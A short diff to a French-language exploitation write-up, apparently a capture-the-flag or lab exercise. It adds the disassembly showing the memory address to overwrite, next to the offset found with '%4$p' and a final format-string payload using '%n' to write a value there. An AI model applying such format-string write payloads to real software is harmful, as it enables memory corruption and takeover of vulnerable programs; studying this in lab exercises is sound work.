@@ -32,6 +32,11 @@ Il s'avère que l'adresse se situe à la 4ème position dans la stack :
     AAAA%4$p
     AAAA0x41414141
 
+Adresse dont on veut modifier le contenu :
+
+    0x080484da <+54>:	mov    0x804988c,%eax
+    0x080484df <+59>:	cmp    $0x40,%eax
+
 Shellcode finale :
 
     \x8c\x98\x04\x08%60x%4$n
